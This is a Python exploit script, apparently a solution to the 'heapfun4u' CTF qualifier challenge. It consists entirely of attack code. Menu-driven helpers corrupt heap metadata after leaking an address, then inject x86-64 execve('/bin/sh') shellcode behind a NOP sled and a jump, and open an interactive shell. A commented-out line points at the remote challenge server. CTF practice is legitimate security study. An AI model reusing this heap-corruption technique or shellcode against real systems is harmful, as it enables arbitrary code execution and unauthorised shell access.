import pwnbox,struct
s = lambda x : struct.pack("<Q",x)
d = lambda x : struct.unpack("<Q",x)[0]
p = pwnbox.pipe.ProcessPipe("./heapfun4u")
#p = pwnbox.pipe.SocketPipe("heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me",3957)
def menu():
  p.read_until("|")

def alloc(size):
  menu()
  p.write("A\n")
  p.read_until(":")
  p.write("%d\n"%size)

def free(idx):
  menu()
  p.write("F\n")
  ret = p.read_until(":")
  p.write("%d\n"%idx)
  return eval(ret.split("\n")[idx-1].split(" ")[1])

def write(idx,buf):
  menu()
  p.write("W\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  p.write("%s\n"%buf)


size = 0x100
alloc(size)
alloc(size)
alloc(size)

adr = free(2)
print hex(adr)
target = 0x602060
l = (target-adr) &0xffffffffffffffff
write(2,s(l)+"A"*(size-32)+"C"*8 + s(adr))
free(2)

shellcode = "\x48\xbe\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xd2\x48\x31\xc0\x50\x56\x48\x31\xf6\x48\x89\xe7\xb0\x3b\x0f\x05"
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = "\x90"*(0xe0-len(shellcode)) +shellcode
code = "\xe9\x7b\xff\xff\xff"
code += "\x90"*(0x10-len(code))

alloc(size-0x20)
write(2,shellcode+code)
menu()
p.write("g\n")
p.interact()

